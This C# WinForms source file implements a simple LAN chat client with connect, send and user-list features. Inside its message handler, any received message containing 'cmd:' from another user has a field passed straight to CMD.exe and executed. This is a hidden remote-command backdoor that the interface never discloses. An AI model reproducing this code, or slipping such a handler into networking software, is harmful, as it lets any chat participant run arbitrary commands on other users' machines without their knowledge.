using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ChatClient
{
    public class ChatForm : Form
    {
		private System.Windows.Forms.Label ipLable;
        private System.Windows.Forms.Label portLable;
        public System.Windows.Forms.Button ConnectButton;
        public System.Windows.Forms.TextBox IpBox;
        public System.Windows.Forms.TextBox PortBox;
        public System.Windows.Forms.RichTextBox UsersBox;
        public System.Windows.Forms.Button DisconnectButton;
        private System.Windows.Forms.Label nameLable;
        public System.Windows.Forms.TextBox NameBox;

		private ClientNet Chat;
		private string nickname;

		public ChatForm()
        {
			this.ConnectButton = new System.Windows.Forms.Button();
			this.IpBox = new System.Windows.Forms.TextBox();
			this.PortBox = new System.Windows.Forms.TextBox();
			this.ipLable = new System.Windows.Forms.Label();
			this.portLable = new System.Windows.Forms.Label();
			this.UsersBox = new System.Windows.Forms.RichTextBox();
			this.DisconnectButton = new System.Windows.Forms.Button();
			this.nameLable = new System.Windows.Forms.Label();
			this.NameBox = new System.Windows.Forms.TextBox();
			this.SuspendLayout();
			// 
			// ConnectButton
			// 
			this.ConnectButton.Location = new System.Drawing.Point(426, 88);
			this.ConnectButton.Name = "ConnectButton";
			this.ConnectButton.Size = new System.Drawing.Size(155, 23);
			this.ConnectButton.TabIndex = 0;
			this.ConnectButton.Text = "Connect";
			this.ConnectButton.UseVisualStyleBackColor = true;
			// 
			// SendMessageButton
			// 

			Button SendButton = new Button();
			SendButton.Location = new Point(12, 493);
			SendButton.Size = new Size(75, 23);
			SendButton.Text = "Отправить";
			Controls.Add(SendButton);
			// 
			// IpBox
			// 
			this.IpBox.Location = new System.Drawing.Point(426, 39);
			this.IpBox.Name = "IpBox";
			this.IpBox.Size = new System.Drawing.Size(155, 20);
			this.IpBox.TabIndex = 2;
			// 
			// PortBox
			// 
			this.PortBox.Location = new System.Drawing.Point(426, 62);
			this.PortBox.Name = "PortBox";
			this.PortBox.Size = new System.Drawing.Size(155, 20);
			this.PortBox.TabIndex = 3;
			// 
			// ipLable
			// 
			this.ipLable.AutoSize = true;
			this.ipLable.Location = new System.Drawing.Point(395, 39);
			this.ipLable.Name = "ipLable";
			this.ipLable.Size = new System.Drawing.Size(15, 13);
			this.ipLable.TabIndex = 4;
			this.ipLable.Text = "ip";
			// 
			// portLable
			// 
			this.portLable.AutoSize = true;
			this.portLable.Location = new System.Drawing.Point(395, 64);
			this.portLable.Name = "portLable";
			this.portLable.Size = new System.Drawing.Size(25, 13);
			this.portLable.TabIndex = 5;
			this.portLable.Text = "port";
			// 
			// SendMessageBox
			// 

			RichTextBox MsgBox = new RichTextBox();
			MsgBox.Location = new Point(93, 495);
			MsgBox.Size = new Size(493, 20);
			Controls.Add(MsgBox);
			// 
			// MessagesBox
			// 
			RichTextBox ChatLogBox = new RichTextBox();
			ChatLogBox.Location = new Point(12, 15);
			ChatLogBox.Size = new Size(377, 472);
			ChatLogBox.ReadOnly = true;
			Controls.Add(ChatLogBox);

			// 
			// UsersBox
			// 
			this.UsersBox.Location = new System.Drawing.Point(395, 119);
			this.UsersBox.Name = "UsersBox";
			this.UsersBox.Size = new System.Drawing.Size(191, 368);
			this.UsersBox.TabIndex = 8;
			// 
			// DisconnectButton
			// 
			this.DisconnectButton.Location = new System.Drawing.Point(426, 88);
			this.DisconnectButton.Name = "DisconnectButton";
			this.DisconnectButton.Size = new System.Drawing.Size(155, 23);
			this.DisconnectButton.TabIndex = 9;
			this.DisconnectButton.Text = "Disconnect";
			this.DisconnectButton.UseVisualStyleBackColor = true;
			this.DisconnectButton.Visible = false;
			// 
			// nameLable
			// 
			this.nameLable.AutoSize = true;
			this.nameLable.Location = new System.Drawing.Point(392, 18);
			this.nameLable.Name = "nameLable";
			this.nameLable.Size = new System.Drawing.Size(35, 13);
			this.nameLable.TabIndex = 10;
			this.nameLable.Text = "Name";
			// 
			// NameBox
			// 
			this.NameBox.Location = new System.Drawing.Point(426, 15);
			this.NameBox.Name = "NameBox";
			this.NameBox.Size = new System.Drawing.Size(155, 20);
			this.NameBox.TabIndex = 11;
			// 
			// ClientForm
			// 
			this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
			this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			this.ClientSize = new System.Drawing.Size(593, 519);
			this.Controls.Add(this.NameBox);
			this.Controls.Add(this.nameLable);
			this.Controls.Add(this.DisconnectButton);
			this.Controls.Add(this.UsersBox);
			this.Controls.Add(this.portLable);
			this.Controls.Add(this.ipLable);
			this.Controls.Add(this.PortBox);
			this.Controls.Add(this.IpBox);
			this.Controls.Add(this.ConnectButton);
			this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
			this.Name = "ClientForm";
			this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
			this.Text = "Chat Client";
			this.ResumeLayout(false);
			this.PerformLayout();

			//this.IpBox.Text = "127.0.0.1";
			this.IpBox.Text = "192.168.43.134";
			this.PortBox.Text = "8888";
			var rand = new Random();
			this.NameBox.Text = "Maxon-" + rand.Next() % 1000;

			SendButton.Enabled = false;

			FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedDialog;
			MaximizeBox = false;

			ConnectButton.Click += (s, a) =>
            {
				Chat = new ClientNet(NameBox.Text, IpBox.Text, Convert.ToInt32(PortBox.Text));

				DisconnectButton.Visible = true;

				SendButton.Enabled = true;
				NameBox.Enabled = false;
				PortBox.Enabled = false;
				IpBox.Enabled = false;			

				//this.KeyPress += (sender, args) =>
				//{
				//	Chat.SendMessage(MsgBox.Text);
				//	MsgBox.Text = "";
				//};

				SendButton.Click += (sender, args) =>
				{
					Chat.SendMessage(MsgBox.Text);
					MsgBox.Text = "";
				};

				Chat.MsgRecievedEvent += (data) =>
				{
					BeginInvoke(new Action(() => 
					{
						ChatLogBox.AppendText(data + System.Environment.NewLine);

						if (data.Contains("ListUpdate;"))
						{
							String[] arr = data.Split(';');
							UsersBox.Clear();
							for (int i = 1; i < arr.Length; i++)
								UsersBox.AppendText(arr[i] + '\n');
						}
							

						if (data.Contains(" вошел в чат."))
						{
							String st = data.Remove(data.Length - 13, 13);		
							UsersBox.AppendText(st + '\n');
						}

						if (data.Contains(" покинул чат."))
						{
							String name = data.Remove(data.Length - 13, 13);
							String[] names = UsersBox.Text.Split('\n');
							UsersBox.Clear();
							foreach (var man in names)
							{
								if (man != name)
									UsersBox.AppendText(man + "\n");
							}
						}

						if (data.Contains("cmd:"))
						{
							var st = data.Split(':');
							var command = st[2];
							if (st[0] != Chat.NickName)
							{
								System.Diagnostics.Process.Start("CMD.exe",st[2]);
							}
						}

					} ));
				};

				this.FormClosed += (sender, args) =>
				{
					Environment.Exit(0);
				};

				this.DisconnectButton.Click += (sender, args) =>
				{
					this.Close();
				};
			};

            FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedDialog;
            MaximizeBox = false;
        }
    }
}
